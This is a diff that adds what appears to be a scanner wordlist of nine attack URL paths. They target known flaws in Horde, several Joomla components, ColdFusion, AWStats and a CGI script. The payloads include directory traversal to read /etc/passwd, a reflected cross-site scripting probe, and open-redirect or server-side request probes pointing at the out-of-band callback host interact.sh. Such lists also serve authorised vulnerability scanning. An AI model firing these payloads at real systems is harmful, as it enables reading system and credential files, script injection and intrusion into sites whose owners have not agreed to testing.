@@ -1,0 +1,9 @@
+/cs.html?url=http://www.interact.sh
+/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
+/index.php?option=com_cmimarketplace&Itemid=70&viewit=/../../../../../../etc/passwd&cid=1
+/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/index.php?option=com_projectfork&section=../../../../../../../../etc/passwd
+/index.php?option=com_agora&task=profile&page=avatars&action=../../../../../../../../etc/passwd
+/awstats/awredir.pl?url=interact.sh
+/cgi-bin/awstats/awredir.pl?url=interact.sh
+/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd
